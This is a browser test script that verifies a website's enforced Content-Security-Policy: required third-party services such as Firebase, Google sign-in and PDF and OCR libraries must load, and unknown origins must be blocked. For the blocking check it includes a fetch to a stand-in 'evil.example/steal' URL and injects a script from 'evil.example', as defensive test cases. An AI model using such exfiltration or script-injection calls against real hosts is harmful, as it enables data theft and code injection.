// New21 security guideline §7: the script rule (Content-Security-Policy) is ENFORCED, not report-only.
// Serves every page with the exact policy from vercel.json and fails when the browser blocks anything the site needs:
// its own scripts and styles, Firebase, Google sign-in, the import readers (SheetJS, pdf.js, mammoth, Tesseract), PubChem.
// It also checks the rule really blocks: a script or a call to an unknown address must be refused.
// Run: node tests/responsive/csp.scenario.mjs
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { launch, openPage, PAGES } from "./harness.mjs";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const vercel = JSON.parse(fs.readFileSync(path.join(HERE, "../../vercel.json"), "utf8"));
const all = vercel.headers.find((h) => h.source === "/(.*)").headers;
const csp = all.find((h) => h.key === "Content-Security-Policy");
let checks = 0, failed = 0;
const ok = (cond, what) => { checks++; if (!cond) { failed++; console.log("FAILED: " + what); } };

ok(!!csp && /default-src 'self'/.test(csp.value) && /script-src /.test(csp.value), "vercel.json enforces the full policy (default-src and script-src)");
ok(!all.some((h) => h.key === "Content-Security-Policy-Report-Only"), "no report-only copy is left");

const watch = () => {
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.effectiveDirective} ${e.blockedURI}`));
};
// What the site really uses, by kind of request.
const NEEDED = {
    connect: ["https://pubchem.ncbi.nlm.nih.gov/rest/pug/compound/name/glycerin/JSON", "https://firestore.googleapis.com/x", "https://identitytoolkit.googleapis.com/x",
        "https://securetoken.googleapis.com/x", "https://firebasestorage.googleapis.com/x", "https://tessdata.projectnaptha.com/4.0.0/eng.traineddata.gz", "https://cdn.jsdelivr.net/npm/x"],
    script: ["https://cdn.sheetjs.com/xlsx-0.20.3/package/xlsx.mjs", "https://cdn.jsdelivr.net/npm/pdfjs-dist@4.4.168/build/pdf.min.mjs",
        "https://cdnjs.cloudflare.com/ajax/libs/mammoth/1.8.0/mammoth.browser.min.js", "https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js",
        "https://apis.google.com/js/api.js", "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js"],
    frame: ["https://glowup-admin-portal.firebaseapp.com/__/auth/iframe"]
};

const browser = await launch();
try {
    for (const key of Object.keys(PAGES)) {
        const { page, ctx, errors, url } = await openPage(browser, key, { go: false, pageHeaders: { "Content-Security-Policy": csp.value } });
        await ctx.addInitScript(watch);
        await page.goto(url, { waitUntil: "load" });
        await page.waitForTimeout(1200);
        const own = await page.evaluate(() => window.__csp.slice());
        ok(own.length === 0, `${key}: the page loads with nothing blocked (${own.join(" | ")})`);
        ok(errors.filter((e) => /Content Security Policy|Refused to/i.test(e)).length === 0, `${key}: no CSP errors in the console (${errors.join(" | ")})`);

        if (key === "cur") {
            const blocked = await page.evaluate(async (need) => {
                window.__csp = [];
                for (const u of need.connect) { try { await fetch(u, { mode: "no-cors" }); } catch (e) { } }
                for (const u of need.script) await new Promise((res) => { const s = document.createElement("script"); s.src = u; s.onload = s.onerror = res; document.head.appendChild(s); setTimeout(res, 800); });
                for (const u of need.frame) await new Promise((res) => { const f = document.createElement("iframe"); f.src = u; document.body.appendChild(f); setTimeout(() => { f.remove(); res(); }, 400); });
                await new Promise((r) => setTimeout(r, 300));
                return window.__csp.slice();
            }, NEEDED);
            ok(blocked.length === 0, `every outside service the site uses is allowed (${blocked.join(" | ")})`);

            const stopped = await page.evaluate(async () => {
                window.__csp = [];
                try { await fetch("https://evil.example/steal", { mode: "no-cors" }); } catch (e) { }
                await new Promise((res) => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; s.onload = s.onerror = res; document.head.appendChild(s); setTimeout(res, 800); });
                await new Promise((r) => setTimeout(r, 200));
                return window.__csp.slice();
            });
            ok(stopped.some((v) => /^connect-src https:\/\/evil\.example/.test(v)), `a call to an unknown address is blocked (${stopped.join(" | ")})`);
            ok(stopped.some((v) => /^script-src(-elem)? https:\/\/evil\.example/.test(v)), `a script from an unknown address is blocked (${stopped.join(" | ")})`);
        }
        await ctx.close();
    }
} finally { await browser.close(); }
console.log(failed === 0 ? `ALL PASSED  (checks made: ${checks})` : `${failed} FAILED  (checks made: ${checks})`);
process.exit(failed === 0 ? 0 : 1);
